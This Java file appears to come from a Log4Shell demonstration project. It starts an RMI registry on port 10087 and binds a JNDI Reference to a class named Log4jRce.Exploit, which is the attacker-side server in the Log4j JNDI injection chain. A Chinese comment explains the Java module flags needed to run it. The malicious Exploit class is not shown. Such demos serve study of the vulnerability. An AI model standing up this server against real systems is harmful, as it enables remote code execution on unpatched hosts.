package Log4jRce;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;

/**
 * Created by hfc on 2021/12/13.
 *
 * Comment on 2024/7/14
 * Java 9 开始 Java 源代码已经进行了模块化改造，且 com.sun.jndi.rmi.registry 包
 * （在 jdk.naming.rmi 模块）内的代码已不再对外可见，为了能让当前 demo 可用则
 * 需要特别设置，即需要在编译和运行两个阶段均设置 jdk.naming.rmi 模块对外可见
 * 1、在 maven-compiler-plugin 内设置编译配置，需要增加如下两个参数
 *      • --add-modules=jdk.naming.rmi
 *      • --add-exports=jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED
 * 2、运行 RimServer.java 之前设置 VM options，需要增加如下两个参数
 *      • --add-modules=jdk.naming.rmi
 *      • --add-exports=jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED
 */
public class RmiServer extends UnicastRemoteObject {

    protected RmiServer() throws RemoteException {
    }

    public static void main(String[] args) throws Exception {

        Registry registry = LocateRegistry.createRegistry(10087);
//        registry.bind("server", new RmiServer());

        Reference reference = new Reference("Log4jRce.Exploit",
                "Log4jRce.Exploit", null);
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.bind("exploit", wrapper);

        System.out.println("--- rmi server started ---");
        Thread.currentThread().join();
    }
}
